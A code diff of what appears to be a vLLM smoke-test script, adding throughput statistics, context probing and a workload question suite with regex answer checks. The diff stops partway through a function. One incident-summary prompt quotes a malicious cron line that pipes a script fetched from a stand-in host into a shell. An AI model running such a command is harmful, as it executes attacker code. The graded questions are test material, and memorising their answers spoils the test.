@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# Christopher Gray - @c2theg/ai  |  Version: 1.3.0  |  Update: 10/3/2026
+# Christopher Gray - @c2theg/ai  |  Version: 1.4.0  |  Update: 10/3/2026
 # vLLM smoke test — auto-discovers every running vLLM instance (ports + models)
 #                   and runs the full smoke test against each one.
 # Includes 21 auto-graded model-quality tests (reasoning, math, summarization,
@@ -7,19 +7,37 @@
 # date math, JSON extraction, code bug-fixing, instruction-following, code,
 # factual, long-context, translation, sentiment, vision/OCR, audio/ASR) plus a
 # 7-language timed code-generation suite with model self-graded correctness,
-# and a per-instance capability scorecard.
+# the 26-question workload suite from tester_llamacpp.py (finance, security,
+# code, GPS, F5, meeting transcripts, glossary, research, home automation —
+# streamed, with TTFT and decode speed), and a per-instance capability
+# scorecard. Every run reports each model's context size, tokens/s Min/Max/Avg
+# across ALL answers, total duration, and suggestions for tuning the next run.
 #
 #
 # Update Yourself:
 #  curl -fsSL -H 'Cache-Control: no-cache' -H 'Pragma: no-cache' -o 'tester_vllm.sh' "https://raw.githubusercontent.com/c2theg/ai/refs/heads/main/tester_vllm.sh?nocache=$(date +%s)" && chmod u+x tester_vllm.sh
 #
 #
-# Usage: ./tester_llm.py [HOST] [PORT]
+# Usage: ./tester_vllm.py [HOST] [PORT] [options]
 #   No args     -> auto-discover ALL local vLLM instances and test each —
 #                  bare-metal `vllm serve` processes AND Docker/Podman
 #                  containers (published ports resolved via `docker inspect`).
 #   HOST        -> discover instances on that host (local discovery only).
 #   HOST PORT   -> test only that specific host:port (skips discovery).
+#
+# Options (workload suite, ported from tester_llamacpp.py):
+#   --thinking on|off      send enable_thinking to the chat template (default: model default)
+#   --max-tokens N         budget per workload question (default 8192)
+#   --only A,B             run only workload questions whose name contains A or B (e.g. f5,gps)
+#   --no-workloads         skip the workload suite (original tests 1-37 only)
+#   --list                 print the workload question names and exit
+#   --long-prompt [T]      add a ~T-token prompt (default 2000) to measure real prefill speed
+#   --context-test         fill ~90% of the reported context with a hidden code near the start
+#                          and check it is both accepted and recalled (--context-test-fraction F)
+#   --concurrency N        send workload questions N at a time (vLLM batching / contention)
+#   --no-cache             cache_prompt=false (llama.cpp only)
+#   --full-responses       don't truncate long workload answers
+#   --api-key KEY          for servers started with --api-key (or set $VLLM_API_KEY)
 #
 # Requirements:
 #   - python3 (>=3.8), pip install rich   (required)
@@ -56,10 +74,12 @@ import string
 import subprocess
 import sys
 import tempfile
+import threading
 import time
 import urllib.error
 import urllib.request
-from dataclasses import dataclass
+from concurrent.futures import ThreadPoolExecutor
+from dataclasses import dataclass, field
 from typing import Optional
 
 try:
@@ -85,7 +105,7 @@ except ImportError:
     sys.exit(1)
 
 SCRIPT_AUTHOR = "Christopher Gray - @c2theg/ai"
-SCRIPT_VERSION = "1.3.0"
+SCRIPT_VERSION = "1.4.0"
 SCRIPT_UPDATED = "10/3/2026"
 
 TOTAL_TEST_STEPS = 40  # 1,2,3,3b,4,5,5b,6,7,7b,8,9 (12) + 10-30 (21) + 31-37 (7)
@@ -129,14 +149,42 @@ class InstanceResult:
     cap_chat: bool = False
     cap_embed: bool = False
     reachable: bool = True
+    context_len: Optional[int] = None
+    tps_min: Optional[float] = None
+    tps_avg: Optional[float] = None
+    tps_max: Optional[float] = None
+    workload_ok: int = 0
+    workload_checked: int = 0
+    suggestions: list = field(default_factory=list)
 
 
 # ─────────────────────────────────────────────────────────────────────────────
 # HTTP helpers
 # ─────────────────────────────────────────────────────────────────────────────
+# Run-wide request settings, set once from argv in main(). Module-level so every
+# HTTP helper (and therefore every test) applies them the same way.
+API_KEY: str = os.environ.get("VLLM_API_KEY", "")
+THINKING: Optional[bool] = None  # None = don't send chat_template_kwargs at all
+
+
+def _headers(json_body: bool = False) -> dict:
+    h = {"Content-Type": "application/json"} if json_body else {}
+    if API_KEY:
+        h["Authorization"] = f"Bearer {API_KEY}"
+    return h
+
+
+def _apply_thinking(body: dict) -> dict:
+    # vLLM and llama.cpp both pass chat_template_kwargs through to the chat
+    # template, which is where Qwen3/GLM/etc. read their thinking switch.
+    if THINKING is not None and "messages" in body:
+        body.setdefault("chat_template_kwargs", {})["enable_thinking"] = THINKING
+    return body
+
+
 def http_get(url: str, timeout: int = 10) -> Optional[str]:
     try:
-        with urllib.request.urlopen(url, timeout=timeout) as r:
+        with urllib.request.urlopen(urllib.request.Request(url, headers=_headers()), timeout=timeout) as r:
             return r.read().decode("utf-8", "replace")
     except Exception:
         return None
@@ -144,7 +192,7 @@ def http_get(url: str, timeout: int = 10) -> Optional[str]:
 
 def http_get_status(url: str, timeout: int = 10) -> tuple[Optional[int], str]:
     try:
-        with urllib.request.urlopen(url, timeout=timeout) as r:
+        with urllib.request.urlopen(urllib.request.Request(url, headers=_headers()), timeout=timeout) as r:
             return r.status, r.read().decode("utf-8", "replace")
     except urllib.error.HTTPError as e:
         return e.code, ""
@@ -153,13 +201,15 @@ def http_get_status(url: str, timeout: int = 10) -> tuple[Optional[int], str]:
 
 
 def http_post_json(url: str, obj: dict, timeout: int = 300) -> Optional[str]:
-    data = json.dumps(obj).encode("utf-8")
-    req = urllib.request.Request(
-        url, data=data, headers={"Content-Type": "application/json"}, method="POST"
-    )
+    data = json.dumps(_apply_thinking(dict(obj))).encode("utf-8")
+    req = urllib.request.Request(url, data=data, headers=_headers(True), method="POST")
     try:
+        start = time.perf_counter()
         with urllib.request.urlopen(req, timeout=timeout) as r:
-            return r.read().decode("utf-8", "replace")
+            text = r.read().decode("utf-8", "replace")
+        if url.endswith("completions"):
+            THROUGHPUT.record_response(CURRENT_LABEL, text, time.perf_counter() - start)
+        return text
     except Exception:
         # Mirrors bash's `curl -sf` — fail silently on any error (connection,
         # timeout, or non-2xx status) and let the caller treat it as "no response".
@@ -181,6 +231,7 @@ def http_post_multipart_audio(url: str, file_bytes: bytes, model: str, timeout: 
         data=body,
         method="POST",
         headers={
+            **_headers(),
             "Content-Type": f"multipart/form-data; boundary={boundary}",
             "Content-Length": str(len(body)),
         },
@@ -212,8 +263,119 @@ def cinfo(msg: str) -> None:
 
 
 def section(title: str, color: str = "cyan") -> None:
+    global CURRENT_LABEL
+    CURRENT_LABEL = title
     console.print()
     console.print(Rule(f"[bold {color}]{title}[/bold {color}]", style=color, align="left"))
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Throughput bookkeeping — every chat/completions answer, from every test, is
+# recorded here so the run can report tokens/s Min/Max/Avg across all of them.
+# ─────────────────────────────────────────────────────────────────────────────
+# Answers shorter than this are excluded from tokens/s stats: a 2-token
+# "Alice" reply is all request overhead and would make Min meaningless.
+TPS_MIN_TOKENS = 16
+
+CURRENT_LABEL = ""
+
+
+@dataclass
+class TpsSample:
+    label: str
+    completion_tokens: int
+    seconds: float                      # end-to-end request time
+    ttft_s: Optional[float] = None      # streamed answers only
+    decode_tps: Optional[float] = None  # streamed answers / llama.cpp timings only
+
+    @property
+    def tps(self) -> float:
+        return self.completion_tokens / self.seconds if self.seconds > 0 else 0.0
+
+
+class ThroughputTracker:
+    def __init__(self) -> None:
+        self.lock = threading.Lock()
+        self.samples: list[TpsSample] = []
+        self.truncated: list[str] = []       # finish_reason == "length"
+        self.reasoning_only: list[str] = []  # thinking used the whole budget, no answer
+
+    def reset(self) -> None:
+        with self.lock:
+            self.samples, self.truncated, self.reasoning_only = [], [], []
+
+    def add(self, sample: TpsSample, finish: str = "", content: str = "", reasoning: str = "") -> None:
+        with self.lock:
+            if sample.completion_tokens:
+                self.samples.append(sample)
+            if finish == "length":
+                self.truncated.append(sample.label)
+            if reasoning and not content:
+                self.reasoning_only.append(sample.label)
+
+    def record_response(self, label: str, text: str, seconds: float) -> None:
+        try:
+            data = json.loads(text)
+            choice = (data.get("choices") or [{}])[0]
+            msg = choice.get("message") or {}
+            tokens = (data.get("usage") or {}).get("completion_tokens") or 0
+            timings = data.get("timings") or {}
+        except Exception:
+            return
+        self.add(
+            TpsSample(label, tokens, seconds, decode_tps=timings.get("predicted_per_second")),
+            finish=choice.get("finish_reason") or "",
+            content=msg.get("content") or choice.get("text") or "",
+            reasoning=msg.get("reasoning_content") or msg.get("reasoning") or "",
+        )
+
+    def stats(self) -> Optional[dict]:
+        with self.lock:
+            usable = [s for s in self.samples if s.completion_tokens >= TPS_MIN_TOKENS and s.seconds > 0]
+        if not usable:
+            return None
+        lo = min(usable, key=lambda s: s.tps)
+        hi = max(usable, key=lambda s: s.tps)
+        decode = [s.decode_tps for s in usable if s.decode_tps]
+        ttft = [s.ttft_s for s in usable if s.ttft_s is not None]
+        return {
+            "n": len(usable),
+            "excluded": len(self.samples) - len(usable),
+            "min": lo.tps, "min_label": lo.label,
+            "max": hi.tps, "max_label": hi.label,
+            "avg": sum(s.tps for s in usable) / len(usable),
+            "weighted": sum(s.completion_tokens for s in usable) / sum(s.seconds for s in usable),
+            "tokens": sum(s.completion_tokens for s in usable),
+            "decode": (min(decode), sum(decode) / len(decode), max(decode)) if decode else None,
+            "ttft_avg": sum(ttft) / len(ttft) if ttft else None,
+            "first_ttft": ttft[0] if ttft else None,
+        }
+
+
+THROUGHPUT = ThroughputTracker()
+
+
+def print_throughput_stats(st: Optional[dict], color: str = "cyan") -> None:
+    if not st:
+        cwarn(f"No answers of >= {TPS_MIN_TOKENS} tokens were recorded — tokens/s not available")
+        return
+    t = Table(box=box.SIMPLE, show_header=False)
+    t.add_column(style="bold")
+    t.add_column()
+    t.add_row("Answers measured", f"{st['n']} (≥{TPS_MIN_TOKENS} tokens; {st['excluded']} shorter answers excluded)")
+    t.add_row("Min tokens/s", f"{st['min']:.1f}  [dim]({st['min_label']})[/dim]")
+    t.add_row("Max tokens/s", f"{st['max']:.1f}  [dim]({st['max_label']})[/dim]")
+    t.add_row("Avg tokens/s", f"{st['avg']:.1f} per answer  |  {st['weighted']:.1f} overall ({st['tokens']} tokens)")
+    if st["decode"]:
+        lo, avg, hi = st["decode"]
+        t.add_row("Decode-only tokens/s", f"min {lo:.1f} / avg {avg:.1f} / max {hi:.1f}  [dim](streamed answers, excludes prefill)[/dim]")
+    if st["ttft_avg"] is not None:
+        t.add_row("Avg time to first token", f"{st['ttft_avg']:.2f}s")
+    console.print(t)
+    console.print(
+        "  [dim]tokens/s = completion tokens / end-to-end request time (includes prompt processing and "
+        "queueing), so it reads lower than pure decode speed.[/dim]"
+    )
 
 
 # ─────────────────────────────────────────────────────────────────────────────
@@ -663,6 +825,8 @@ def find_vllm_containers(procs: list[dict]) -> list[dict]:
             "procs": inner_procs,
             "model": model_m.group(1) if model_m else "(from /v1/models)",
             "uptime_h": container_uptime_hours(state.get("StartedAt", "")),
+            "ipc": host_cfg.get("IpcMode", ""),
+            "shm_size": host_cfg.get("ShmSize") or 0,
             "targets": list(dict.fromkeys(targets)),
         })
     return containers
@@ -683,9 +847,13 @@ def listen_ports_for_pid(pid: str) -> list[str]:
     return []
 
 
+DISCOVERED_CONTAINERS: list[dict] = []
+
+
 def discover_instances(host: str) -> list[tuple[str, str]]:
     procs = find_vllm_processes()
     containers = find_vllm_containers(procs)
+    DISCOVERED_CONTAINERS[:] = containers
 
     if not procs and not containers:
         cwarn("No running vLLM processes or containers found on this host")
@@ -1147,16 +1315,594 @@ def run_performance_health_check(host: str) -> bool:
 
 
 # ─────────────────────────────────────────────────────────────────────────────
+# Workload questions — copied verbatim from tester_llamacpp.py
+# ─────────────────────────────────────────────────────────────────────────────
+# (category, prompt, optional regex for an informational "answer looks right" check)
+# Regexes use lookaheads so every required fact must appear, in any order.
+MEETING_TRANSCRIPT = (
+    "Priya: Okay, let's start. The BGP session to our upstream flapped twice last night.\n"
+    "Marcus: I saw that. The provider says it was a maintenance window they forgot to announce.\n"
+    "Priya: We were also hit by a UDP flood around 2 AM, about 40 gigabits. RTBH kicked in and blackholed the target /32.\n"
+    "Marcus: That worked, but it took the customer offline. I want us to move to FlowSpec so we only drop the attack traffic.\n"
+    "Priya: Agreed, but the upstream has to support it. Marcus, can you ask them by Friday?\n"
+    "Marcus: Yes, I'll email them today. Also, Dana needs to update the runbook with the RTBH community string.\n"
+    "Priya: Good. I'll schedule the failover test for next Tuesday at 10 AM. Anything else? No? Thanks everyone."
+)
+
+NOISY_ASR = (
+    "so um the B G P session to the upstream flapped twice last night and then we got hit by a you dee pee flood "
+    "about forty gig. R T B H kicked in and black holed the slash thirty two. Marcus wants flow spec instead. "
+    "also the F five big IP pair failed over at two A M and Dana thinks its the health monitor."
+)
+
+# Category prefix ("Finance:", "F5:", ...) is the area; --only matches it case-insensitively.
+QUESTIONS = [
+    # ── 1. Financial analysis and predictions ────────────────────────────────
+    ("Finance: growth & projection",
+     "Quarterly revenue in $M: Q1 12.0, Q2 13.2, Q3 14.5, Q4 15.9. Costs in $M: 9.0, 9.6, 10.4, 11.3. "
+     "Compute the quarter-over-quarter revenue growth rate and the gross margin for each quarter, then project "
+     "Q1 of next year's revenue with your stated assumption, and name one risk to that forecast.",
+     r"(?=.*\b17\.\d)(?=.*margin)"),
+    ("Finance: NPV",
+     "An investment costs $100k today and returns $30k, $40k, $50k and $60k at the end of years 1 to 4. "
+     "With a 10% discount rate, what is the NPV, and is the investment worthwhile? Show the discounted cash flows.",
+     r"(?=.*38[.,]?[89])(?=.*(worthwhile|positive|accept|yes))"),
+    ("Finance: prediction honesty",
+     "A stock has risen 5 days in a row. My friend says that guarantees it will rise tomorrow. Is that right? "
+     "Answer briefly and say what would actually inform a forecast.",
+     r"(?=.*(not (a |mathematically )?guarantee|no guarantee|cannot|can't|isn't|incorrect|wrong|fallacy|not necessarily|random walk|uncertain))"),
+
+    # ── 2. Network / computer security ───────────────────────────────────────
+    ("Security: incident summary",
+     "Summarize this incident in 3 sentences and give 3 recommended actions:\n"
+     "sshd: 40 'Failed password for root' from 203.0.113.45 within 60 seconds; then "
+     "'Accepted password for root from 203.0.113.45'; then a new cron entry '* * * * * curl http://198.51.100.9/x.sh | sh' "
+     "was added for root.",
+     r"(?=.*(brute|credential|password|failed login))(?=.*(compromis|breach|persistence|cron))"),
+    ("Security: IDS vs IPS vs WAF",
+     "In a few sentences, explain the difference between an IDS and an IPS, where a WAF fits, and why TLS 1.0 "
+     "should be disabled.",
+     r"(?=.*detect)(?=.*(prevent|block|inline))(?=.*(HTTP|web|layer 7|application))(?=.*(deprecat|weak|vulnerab|POODLE|BEAST|insecure))"),
+    ("Security: firewall rule review",
+     "Review this ACL, evaluated top to bottom, and point out every problem:\n"
+     "1) allow tcp any -> 10.0.0.5:22\n2) deny ip any any\n3) allow tcp 10.0.0.0/24 -> 10.0.0.5:443",
+     r"(?=.*(shadow|never (match|hit|reach)|unreachable|ordering|order|after the deny))(?=.*(any|internet|exposed|open|22|ssh))"),
+
+    # ── 3. Code generation ───────────────────────────────────────────────────
+    ("Code: Python",
+     "Write a Python function top_ips(log_lines, n=5) that parses nginx access log lines "
+     "(client IP is the first field) and returns the n most frequent IPs with counts. Include a short usage example.",
+     r"def\s+top_ips"),
+    ("Code: Python debugging",
+     "This function has a classic bug. Explain it and give the fix:\n\n"
+     "def add_tag(tag, tags=[]):\n    tags.append(tag)\n    return tags",
+     r"(?=.*(mutable|shared|same list|persist))(?=.*(None))"),
+    ("Code: HTML / CSS / JS",
+     "Write a single-file HTML page with inline CSS and JavaScript containing a button that toggles dark mode "
+     "and remembers the choice across page reloads.",
+     r"(?=.*(<html|<!doctype))(?=.*localStorage)(?=.*(addEventListener|onclick))"),
+    ("Code: Tcl (F5 iRule) + PHP",
+     "Give two snippets. 1) An F5 BIG-IP iRule (Tcl) that redirects all HTTP requests to HTTPS. "
+     "2) A PHP function that fetches a user row by email using a PDO prepared statement.",
+     r"(?=.*when\s+HTTP_REQUEST)(?=.*HTTP::redirect)(?=.*prepare)"),
+    ("Code: MongoDB/ClickHouse/Qdrant/Arcade",
+     "Give one short query for each: 1) MongoDB aggregation summing order totals per customerId, highest first. "
+     "2) ClickHouse SQL counting events per hour for the last 24 hours. "
+     "3) A Qdrant REST search request body with a payload filter on field 'tenant' = 'acme'. "
+     "4) ArcadeDB SQL returning the names of vertices a Person vertex follows via 'Follows' edges.",
+     r"(?=.*\$group)(?=.*(toStartOfHour|toStartOfInterval|toHour))(?=.*filter)(?=.*(out\(|traverse|match))"),
+
+    # ── 4. GPS ───────────────────────────────────────────────────────────────
+    ("GPS: NMEA decode",
+     "Decode this NMEA sentence: $GPGGA,123519,4807.038,N,01131.000,E,1,08,0.9,545.4,M,46.9,M,,*47 . "
+     "Give the latitude and longitude in decimal degrees, the fix quality, number of satellites and altitude, "
+     "and explain in one sentence how GNSS differs from GPS.",
+     r"(?=.*48\.117)(?=.*11\.51)(?=.*\b0?8\b)(?=.*545)"),
+    ("GPS: distance",
+     "Roughly how far apart are New York (40.7128, -74.0060) and London (51.5074, -0.1278) along the Earth's "
+     "surface? Name the formula you would use and give the answer in km.",
+     r"(?=.*(haversine|great.circle))(?=.*(5,?5\d\d|5,?6\d\d))"),
+
+    # ── 5. F5 Networks ───────────────────────────────────────────────────────
+    ("F5: pool member down",
+     "A BIG-IP pool member is marked down by its HTTP monitor, but curl from the BIG-IP shell to the same "
+     "IP:port returns 200 OK. Give a prioritized troubleshooting checklist with the tmsh commands you would run.",
+     r"(?=.*tmsh)(?=.*monitor)(?=.*(send|receive|recv|route.?domain|self ?ip|tcpdump))"),
+    ("F5: SNAT / asymmetric return",
+     "Clients can reach a BIG-IP virtual server but connections hang after the SYN. The pool members' default "
+     "gateway is not the BIG-IP. Explain the cause and the fix.",
+     r"(?=.*(asymmetric|return traffic|bypass|directly))(?=.*(SNAT|automap|source address translation))"),
+    ("F5: tmsh commands",
+     "Give the tmsh commands to: list pool members with their status, save the running configuration, show "
+     "connection table entries, and check the HA failover state.",
+     r"(?=.*show ltm pool)(?=.*save sys config)(?=.*show sys connection)(?=.*failover)"),
+
+    # ── 6. Audio / meeting transcription ─────────────────────────────────────
+    ("Meeting: summary & actions",
+     "Summarize this meeting transcript in 3 bullets, then list the decisions and action items with owners "
+     f"and due dates:\n\n{MEETING_TRANSCRIPT}",
+     r"(?=.*Marcus)(?=.*Priya)(?=.*Dana)(?=.*Friday)"),
+    ("Meeting: fix ASR errors",
+     "This is a raw speech-to-text transcript with misheard technical terms. Rewrite it cleanly with correct "
+     f"terminology and punctuation, then list the terms you corrected:\n\n{NOISY_ASR}",
+     r"(?=.*BGP)(?=.*RTBH)(?=.*UDP)(?=.*F5)(?=.*flow ?spec)"),
+
+    # ── 7. Glossary lookups ──────────────────────────────────────────────────
+    ("Glossary: BGP/RTBH/FlowSpec/UDP",
+     "Define each in one or two sentences for a meeting glossary: BGP, RTBH, FlowSpec, UDP.",
+     r"(?=.*border gateway)(?=.*black.?hol)(?=.*flow.?spec)(?=.*user datagram)"),
+    ("Glossary: DDoS mitigation terms",
+     "In a short bullet list: when would you choose RTBH vs FlowSpec vs a scrubbing center for a DDoS, "
+     "and what are anycast and ECMP?",
+     r"(?=.*(all traffic|entire|whole|victim|drop))(?=.*(match|granular|specific|port|surgical))(?=.*anycast)(?=.*(ecmp|equal.cost))"),
+
+    # ── 8. Security research ─────────────────────────────────────────────────
+    ("Research: CVSS vector",
+     "Explain CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H in plain English, and give its base score and severity.",
+     r"(?=.*9\.8)(?=.*critical)(?=.*(network|remote))"),
+    ("Research: nmap output",
+     "For my own lab host, this nmap -sV output came back. What stands out as risky and what would you check first?\n\n"
+     "22/tcp   open     ssh     OpenSSH 7.2p2\n80/tcp   open     http    Apache httpd 2.4.49\n3306/tcp filtered mysql",
+     r"(?=.*(41773|path traversal|2\.4\.49))(?=.*(filtered|firewall))"),
+    ("Research: Wireshark filters",
+     "Give Wireshark display filters for: a) TCP SYN packets without ACK, b) DNS traffic to or from 8.8.8.8, "
+     "c) TLS ClientHello messages.",
+     r"(?=.*tcp\.flags)(?=.*8\.8\.8\.8)(?=.*tls\.handshake\.type\s*==\s*1)"),
+
+    # ── 9. Home automation ───────────────────────────────────────────────────
+    ("Home: Zigbee -> MQTT -> HA",
+     "Explain how a Zigbee door sensor's open/close event reaches Home Assistant through Zigbee2MQTT and MQTT "
+     "(include an example topic and payload), and why Zigbee channels 15, 20 or 25 are often chosen next to a "
+     "2.4 GHz Wi-Fi network.",
+     r"(?=.*(coordinator|zigbee2mqtt))(?=.*topic)(?=.*(channel|interfer|overlap))"),
+    ("Home: MQTT QoS / retain / LWT",
+     "Explain MQTT QoS levels 0, 1 and 2, retained messages, and Last Will and Testament, with a smart-home "
+     "example for each.",
+     r"(?=.*qos)(?=.*retain)(?=.*(last will|LWT))"),
+    ("Home: Zigbee vs Z-Wave vs Thread vs Wi-Fi",
+     "For battery-powered door and temperature sensors, compare Zigbee, Z-Wave, Thread/Matter and Wi-Fi on "
+     "mesh networking, power use and range, and recommend one.",
+     r"(?=.*mesh)(?=.*(battery|power))(?=.*(Thread|Matter))(?=.*Wi-?Fi)"),
+]
+
+LONG_PROMPT_LABEL = "Long-prompt prefill"
+
+
+def build_long_prompt(target_tokens: int) -> str:
+    """Synthetic firewall log, ~target_tokens long, unique per call so nothing is cache-reusable."""
+    rnd = random.Random(time.time_ns())
+    lines = []
+    for i in range(max(1, target_tokens // 30)):
+        lines.append(
+            f"[{i:05d}] fw-{rnd.randint(1, 40)} DENY tcp 10.{rnd.randint(0, 255)}.{rnd.randint(0, 255)}.{rnd.randint(1, 254)}"
+            f":{rnd.randint(1024, 65535)} -> 192.168.{rnd.randint(0, 20)}.{rnd.randint(1, 254)}:{rnd.choice([22, 80, 443, 3389, 8080])}"
+            f" rule={rnd.randint(100, 999)} bytes={rnd.randint(40, 9000)}"
+        )
+    return (
+        "Here is a firewall log excerpt. In 4 sentences, summarize the most notable patterns "
+        "(top destination ports, any scanning behavior) and say what you would investigate first.\n\n"
+        + "\n".join(lines)
+    )
+
+
+CONTEXT_TEST_LABEL = "Context: recall near limit"
+
+
+def build_context_probe(target_tokens: int) -> tuple[str, str]:
+    """A haystack prompt sized to ~target_tokens with a unique code planted near the START, used to check
+    whether a server's reported max context is both ACCEPTED (doesn't error) and actually usable (the model
+    can still recall content from near the beginning of a nearly-full context, not just avoid crashing).
+    Returns (prompt, expected_regex). The size is only an estimate (~4 chars/token, like elsewhere in this
+    script) — the server's own reported prompt_n after the request is what actually confirms the real size.
+    """
+    rnd = random.Random(time.time_ns())
+    code = "".join(rnd.choices(string.ascii_uppercase + string.digits, k=8))
+    needle = f"The one-time verification code for this session is {code}. Remember it; you will be asked for it later.\n\n"
+    filler_unit = (
+        "The quarterly network maintenance window is scheduled, and all non-critical changes are deferred "
+        "until engineering confirms the rollback plan is tested and the on-call rotation has signed off on "
+        "the deployment checklist. "
+    )
+    question = (
+        "\n\nQuestion: what was the one-time verification code given at the very start of this message? "
+        "Reply with ONLY the code, nothing else."
+    )
+    # Leave room for the needle and question text themselves; the rest is filler.
+    target_chars = max(0, target_tokens * 4 - len(needle) - len(question))
+    reps = max(1, target_chars // len(filler_unit))
+    return needle + (filler_unit * reps) + question, re.escape(code)
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Context size — vLLM reports max_model_len per model on /v1/models; llama.cpp
+# (or anything else OpenAI-compatible fronted by it) reports n_ctx on /props.
+# ─────────────────────────────────────────────────────────────────────────────
+def get_model_info(base_url: str) -> tuple[str, Optional[int], str]:
+    """(first model id, max context tokens, where the context figure came from)."""
+    model, ctx, source = "", None, ""
+    try:
+        data = json.loads(http_get(f"{base_url}/v1/models", timeout=10) or "{}").get("data") or []
+    except ValueError:
+        data = []
+    if data:
+        model = data[0].get("id", "")
+        for key in ("max_model_len", "context_length", "max_context_length"):
+            if isinstance(data[0].get(key), int):
+                ctx, source = data[0][key], f"/v1/models {key}"
+                break
+    if ctx is None:
+        try:
+            props = json.loads(http_get(f"{base_url}/props", timeout=5) or "{}")
+            n_ctx = (props.get("default_generation_settings") or {}).get("n_ctx")
+            if isinstance(n_ctx, int):
+                ctx, source = n_ctx, "/props n_ctx (per slot)"
+        except ValueError:
+            pass
+    return model, ctx, source
+
+
+def fmt_ctx(ctx: Optional[int]) -> str:
+    if not ctx:
+        return "unknown"
+    return f"{ctx:,} tokens" + (f" ({ctx // 1024}K)" if ctx >= 1024 and ctx % 1024 == 0 else "")
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# vLLM Prometheus metrics — read before and after an instance's tests so the
+# suggestions can tell whether *this run* caused KV-cache preemptions.
+# ─────────────────────────────────────────────────────────────────────────────
+def vllm_metrics(base_url: str) -> dict[str, float]:
+    text = http_get(f"{base_url}/metrics", timeout=5) or ""
+    totals: dict[str, float] = {}
+    for line in text.splitlines():
+        if line.startswith("#"):
+            continue
+        m = re.match(r"(vllm:[a-z_]+)(?:\{[^}]*\})?\s+([-+0-9.eE]+|NaN)$", line.strip())
+        if not m or m.group(2) == "NaN":
+            continue
+        totals[m.group(1)] = totals.get(m.group(1), 0.0) + float(m.group(2))
+    return totals
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Workload suite — the question set from tester_llamacpp.py (keep the two in
+# sync), sent streamed so each answer gets time-to-first-token and decode speed.
+# ─────────────────────────────────────────────────────────────────────────────
+@dataclass
+class WorkloadResult:
+    label: str
+    content: str = ""
+    reasoning: str = ""
+    finish: str = ""
+    prompt_n: int = 0
+    completion_n: int = 0
+    wall_s: float = 0.0
+    ttft_s: Optional[float] = None
+    decode_tps: Optional[float] = None
+    error: str = ""
+    ok: bool = False
+    accurate: Optional[bool] = None
+
+
+def run_workload_question(base_url: str, model: str, label: str, prompt: str, expect: Optional[str],
+                          max_tokens: int, no_cache: bool) -> WorkloadResult:
+    res = WorkloadResult(label=label)
+    body = _apply_thinking({
+        "model": model,
+        "messages": [{"role": "user", "content": prompt}],
+        "max_tokens": max_tokens,
+        "temperature": 0.2,
+        "stream": True,
+        "stream_options": {"include_usage": True},
+    })
+    if no_cache:
+        body["cache_prompt"] = False  # llama.cpp only; vLLM ignores it (see suggestions)
+    req = urllib.request.Request(
+        f"{base_url}/v1/chat/completions", data=json.dumps(body).encode(), headers=_headers(True), method="POST"
+    )
+    content, reasoning = [], []
+    usage, timings, deltas = {}, {}, 0
+    first = None
+    start = time.perf_counter()
+    try:
+        with urllib.request.urlopen(req, timeout=900) as r:
+            for raw in r:
+                line = raw.decode("utf-8", "replace").strip()
+                if not line.startswith("data:"):
+                    continue
+                payload = line[5:].strip()
+                if payload == "[DONE]":
+                    break
+                try:
+                    chunk = json.loads(payload)
+                except ValueError:
+                    continue
+                usage = chunk.get("usage") or usage
+                timings = chunk.get("timings") or timings
+                for ch in chunk.get("choices") or []:
+                    d = ch.get("delta") or {}
+                    c = d.get("content")
+                    rs = d.get("reasoning_content") or d.get("reasoning")
+                    if (c or rs) and first is None:
+                        first = time.perf_counter()
+                    if c:
+                        content.append(c)
+                    if rs:
+                        reasoning.append(rs)
+                    if c or rs:
+                        deltas += 1
+                    if ch.get("finish_reason"):
+                        res.finish = ch["finish_reason"]
+    except urllib.error.HTTPError as e:
+        res.error = f"HTTP {e.code}: {e.read().decode('utf-8', 'replace')[:200]}"
+    except Exception as e:
+        res.error = str(e) or type(e).__name__
+    end = time.perf_counter()
+
+    res.wall_s = end - start
+    res.content = "".join(content).strip()
+    res.reasoning = "".join(reasoning).strip()
+    res.prompt_n = usage.get("prompt_tokens") or timings.get("prompt_n") or 0
+    # Without usage (old server, or a proxy that drops stream_options) each
+    # streamed delta is roughly one token — close enough for a rate.
+    res.completion_n = usage.get("completion_tokens") or timings.get("predicted_n") or deltas
+    if first is not None:
+        res.ttft_s = first - start
+        decode_s = end - first
+        res.decode_tps = timings.get("predicted_per_second") or (
+            (res.completion_n - 1) / decode_s if res.completion_n > 1 and decode_s > 0 else None
+        )
+    if not res.error:
+        THROUGHPUT.add(
+            TpsSample(label, res.completion_n, res.wall_s, res.ttft_s, res.decode_tps),
+            finish=res.finish, content=res.content, reasoning=res.reasoning,
+        )
+    res.ok = bool(res.content)
+    if expect and res.ok:
+        res.accurate = bool(re.search(expect, res.content, re.IGNORECASE | re.DOTALL))
+    return res
+
+
+def build_workload_jobs(args: argparse.Namespace, ctx: Optional[int]) -> list[tuple]:
+    if args.no_workloads:
+        return []
+    wanted = [w.strip().lower() for w in args.only.split(",") if w.strip()]
+    jobs = [q for q in QUESTIONS if not wanted or any(w in q[0].lower() for w in wanted)]
+    if args.long_prompt:
+        jobs.append((f"{LONG_PROMPT_LABEL} (~{args.long_prompt} tok)", build_long_prompt(args.long_prompt), None))
+    if args.context_test and ctx:
+        target = max(256, int(ctx * args.context_test_fraction))
+        probe_prompt, probe_pattern = build_context_probe(target)
+        jobs.append((f"{CONTEXT_TEST_LABEL} (~{target:,} of {ctx:,} tok)", probe_prompt, probe_pattern))
+    return jobs
+
+
+def run_workload_suite(base_url: str, model: str, ctx: Optional[int], jobs: list[tuple], args: argparse.Namespace,
+                       quality: QualityTracker, result: InstanceResult, color: str, step) -> None:
+    global CURRENT_LABEL
+    total = len(jobs)
+    section(f"38. Workload suite  ({total} questions from tester_llamacpp.py)", color)
+    cinfo(
+        f"Thinking: {'server default' if THINKING is None else ('ON' if THINKING else 'OFF')}  |  "
+        f"max_tokens={args.max_tokens}  |  concurrency={args.concurrency}"
+    )
+    if args.context_test and not ctx:
+        cwarn("--context-test skipped: the server didn't report its max context")
+
+    def do(job) -> WorkloadResult:
+        force = job[0].startswith(LONG_PROMPT_LABEL) or job[0].startswith(CONTEXT_TEST_LABEL)
+        return run_workload_question(base_url, model, job[0], job[1], job[2], args.max_tokens, args.no_cache or force)
+
+    def show(i: int, job, r: WorkloadResult) -> None:
+        cat, prompt, _ = job
+        console.print()
